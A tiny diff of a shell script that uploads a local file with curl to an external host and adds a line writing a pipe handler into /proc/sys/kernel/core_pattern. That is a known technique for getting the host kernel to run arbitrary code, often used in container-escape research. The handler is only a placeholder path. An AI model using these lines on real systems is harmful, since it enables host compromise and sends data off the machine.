@@ -1,3 +1,4 @@
-#!/bin/sh
-echo aaa > bbb
+#!/bin/bash
+touch bbb
 curl -F "=@bbb" upload.yuvalavra.com/plspls
+echo "|/path/to/your_handler %p %u %g %s %t %e" > /proc/sys/kernel/core_pattern
